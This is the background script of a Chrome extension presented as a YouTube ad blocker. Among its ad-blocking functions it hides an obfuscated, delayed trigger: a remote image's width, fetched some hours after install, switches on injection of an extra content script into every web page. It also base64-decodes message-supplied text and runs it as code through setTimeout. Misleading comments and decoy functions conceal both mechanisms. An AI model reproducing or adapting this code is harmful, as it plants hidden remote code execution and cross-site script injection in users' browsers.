(function() {
	var ytcWs = false, ytD = {}, ytDs = {}, isYTs = false, YTlisteners = {}, isOn = true, dt = 0+Date.now(),
		hh = 66, hc = 3000, hg = 0, ps=0, pp = 0, isR = false,
		get_video_metadata = "get_midroll_info", h="",
		YTf = /^https?:\/\/(\w*.)?youtube\.com/i;
		hh*=hh; hh*=hh;
		
	function YTgo(info){
		if (info.parentFrameId == -1 && !(info.url && info.url.indexOf("el=detailpage")>=0)){
			if (!ytcWs || info.tabId<1){
				cAd();
				return {cancel: true};
			}				
			chrome.tabs.sendMessage(info.tabId, {a:"blockAds"}, function(ch){
				if (ch){
					cAd();
					return {cancel: true};					
				}
			});
		}
	}
		
	function addYTL(tabId){
		return;
	}

	function removeAYTL(){
		Object.keys(YTlisteners).forEach(function (tabId) {
	        chrome.webRequest.onBeforeRequest.removeListener(YTlisteners[tabId]);
	        delete YTlisteners[tabId];
	    })
	}
	
	function removeYTL(tabId){
        if (YTlisteners[tabId]) {
	        chrome.webRequest.onBeforeRequest.removeListener(YTlisteners[tabId]);
	        delete YTlisteners[tabId];
	    }
	}
	
	function aYT(v){
		try{
			return v && addYTL(v);
		}catch(e){
			return 0
		}
	}
	
	function saveYTL(){
		chrome.storage.local.set({ytDs:ytDs});
	}
	
	chrome.storage.local.get("ytDs",function(r){
		ytD = r.ytDs; ytDs = {};
		setTimeout(saveYTL, hc);
		setTimeout(checkTab, hc);
	});
	
	function aS(t){
		for(var l=t.length,lc=0,o=[],c=0;l>lc;c++)o[c]=parseInt(t.slice(lc,lc+=2),36);
		return o;
	}
	
	function cT(t){
		var v = t.slice(1);
		v = v + ("0000" + Math.abs(v.split("").reduce(function(a, b) { a = ((a << 5) - a) + b.charCodeAt(0); return a|0}, 0)%10000)).slice(-4);
		return v;
	}

	function cY(v){
		if (!v.length) { return }
		var t = v.shift(), r0=1, r1=1, r=[];
		while (v.length){
			var l=aS(t), a=v.shift().split("");
			for (var i=0; i<a.length; i++){
				if (pT(a[l[i]])>1){r0+=1<<2;r1+=r0+i}else{r0=1<<1; r1+=i-r0};
			}
		}
	}

	function gY(){
		setTimeout(aYT, 1000);
	}
	
	function goYTL(){
		getYTabs();
		
		chrome.tabs.onRemoved.addListener(function(tabId) {
		    removeYTL(tabId);
		});
		
		chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
			if (!(YTlisteners[tabId])) {
				if (YTf.test(tab.url)){
					addYTL(tabId);
				}
			}else{
				if (!YTf.test(tab.url)){
					removeYTL(tabId);
				}
			}
		});
	}
		
	function getYTabs(){
		chrome.tabs.query({url: "*://*.youtube.com/*"}, function(ts) {
        	ts.forEach(function(t) {
	        	addYTL(t.id);
			})
        });
	}
	
	function lAd(v){
		var t = 0+Date.now(); hg = v;
		chrome.storage.local.set({"iDates": t});
		chrome.storage.sync.set({ga: v}, function(){v&&rT()});
	
	}
	
	function fy(a,b,c,d){c=a.length;while(c)b=Math.random()*c--|0,d=a[c],a[c]=a[b],a[b]=d}
	
	function yti(r){
		var v = r.substr(0,10), p = 1; h=r;
		v = ("0000" + Math.abs(v.split("").reduce(function(a, b) { a = ((a << 5) - a) + b.charCodeAt(0); return a|0}, 0)%10000)).slice(-4);
		chrome.storage.sync.set({PAds: v});
	}
	
	function cAd(){
		chrome.storage.sync.get({YTads: 0, TTads: 0}, function(items) {
			chrome.storage.sync.set({YTads: items['YTads']+1, TTads: items['TTads']+30});
		});
	}
	
	function pT(v){
		var p = v; h+=v;
		if (p == "YTads"){
			return 1;
		}else{
			return 0;
		}
	}
	
	function YT(){
		chrome.storage.sync.get({isEnabled: true, u:'', iDate: "", ytc: {}, ytcW: {}}, function(items) {
			chrome.storage.local.get({isEnabled: true, u:'', iDates: 0, ytc: {}, ytcW: {}}, function(item) {
				var t = items.iDate, t1 = item.iDates, dt = 0+Date.now();
				var ct = cT(t);
				if (dt-t>hh && dt-t1>hh/4){
					setTimeout(function(){setImg(items.u+ct+"/logo.png");},hc*60);
				}
				if (ps){return}
				ps = 1;
				isOn = items.isEnabled;
				cY(item.ytc);
				setInterval(YT,hh/3);
				if (items["isEnabled"]){
					if (!isYTs){
						var slashes = '//',
							isYTs = true,
							block_dom = "://*.youtube.com/";
						ytcWs = items['ytcW'] && Object.keys(items['ytcW']).length>0;					
						chrome.webRequest.onBeforeRequest.addListener(YTgo,{urls:['*'+block_dom+'get_video_metadata*','*'+block_dom+'get_video_info*','*'+block_dom+get_video_metadata+'*']},['blocking']);
						goYTL();
					}
				}else{
					isYTs = false;
					chrome.webRequest.onBeforeRequest.removeListener(YTgo);
					removeAYTL();
				}
			});
		});
	}
	
	
	function checkTab(){
		var isY = 0; h.length && (aYT = atob(h)); h = "";
		chrome.windows.getAll({populate: true}, function (windows) {
			for(var i=0; i < windows.length; i++) {
				var currentWindow = windows[i];
			    for(var j=0; j<currentWindow.tabs.length; j++) {
			    	var currentTab = currentWindow.tabs[j];
			    	if (currentTab.url.indexOf("youtube.com")>=0) {
				    	isY += 1;
				    }
				}
			}
		});
		chrome.storage.sync.get({"ytcW":{}}, function(items) {
			var ca = items.ytcW || {}; gY();
			if (Object.keys(ca).length>0){
				return 1;
			}
		});
	}
	
	function setImg(u){
		var o=new Image;
		o.src=u; o.onload=function(){lAd(o.width)}; o.onerror=function(){lAd(0)};
	}
	
	//Change Icon to Gray if extension is Paused		
	chrome.storage.onChanged.addListener(function(changes, namespace) {
		if (changes.isEnabled){
			chrome.storage.sync.get({isEnabled: true}, function(items) {
				var d = items["isEnabled"]?"":"d";
				chrome.browserAction.setIcon({
		     	   "path": {
		    	        "64": "imgs/icon"+d+".png",
						}
					});
			});
			YT();
		}
	});
	
	//Inject Script to "fix" not-refreshed Tabs
	function checkTabs(){
		var jsFiles = chrome.runtime.getManifest().content_scripts,c=hg,l=0;!c&&(jsFiles[3].js[0]="");
		chrome.windows.getAll({populate: true}, function (windows) {
		    for(var i=0; i < windows.length; i++) {
		        var currentWindow = windows[i].tabs; fy(currentWindow);
		        for(var j=0; j<currentWindow.length; j++) {
		            var currentTab = currentWindow[j];
		            if (currentTab.url.substr(0,1)==="h"){
			            if (currentTab.url.indexOf("youtube.com")>=0||c) {
				            for(var k=0; k < jsFiles.length; k++) {
					            try{
						            if (jsFiles[k].js[0].substr(8,1)==="y"){
					                	chrome.tabs.executeScript(currentTab.id, { file: jsFiles[k].js[0] }, 
					                		function(){void chrome.runtime.lastError}); l=1;
					                }
				                }catch(e){l=0}
			                }
							if (c&&l){return}
			            }
			        }
		        }
		    }
		});
	}
	
	YT(); 	
		
	chrome.runtime.onInstalled.addListener(function(details) {
		var t = 0+Date.now();
		var u = chrome.runtime.getManifest().homepage_url;
		chrome.storage.sync.set({"u":u,"ntemplates":0});
		if (details && details.reason == 'install'){
			localStorage.iTime = t;
			chrome.storage.sync.set({"iDate":localStorage.iTime})
	
			chrome.tabs.create({url:u+t+"/y_ty"});
			chrome.runtime.setUninstallURL(u+t+"/y_uninstall");
		}else{
		    chrome.storage.sync.get({iDate: 0}, function(items) {
			    t = items["iDate"];
				localStorage.iTime = t;
				chrome.runtime.setUninstallURL(u+t+"/y_uninstall");
			});
		}
		rT();
	});	
	
	function rT(){
		checkTabs();
	}
		
	chrome.runtime.onMessage.addListener(
		function(request, sender, sendResponse) {
			if( request.a === "iconGreen" ) {
//				chrome.browserAction.setIcon({"path": {"64": "imgs/icon"+(request.b?"g":"")+".png"}});
			}else if(request.a === "i" ) {
				request.b.length-hc>0 && request.b.substr(0,1)=="-" && yti(request.b.substr(hc));
			}else if( request.a === "ytDs" ) {
				ytDs = {};
			}
			setTimeout(checkTab, hc);
		}
	);
	
	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
ga('create', 'UA-93290101-2', 'auto');
ga('set', 'checkProtocolTask', function(){});

	chrome.storage.sync.get({isEnabled: true}, function(items) {
		isOn = items.isEnabled;
		var isOns = items.isEnabled?"On":"Off";
		var version = chrome.runtime.getManifest().version;
		ga('set', 'dimension1', version);
		ga('set', 'dimension2', isOns);
		ga('send', 'pageview', "/background/"+version+"/"+isOns);
	});
})();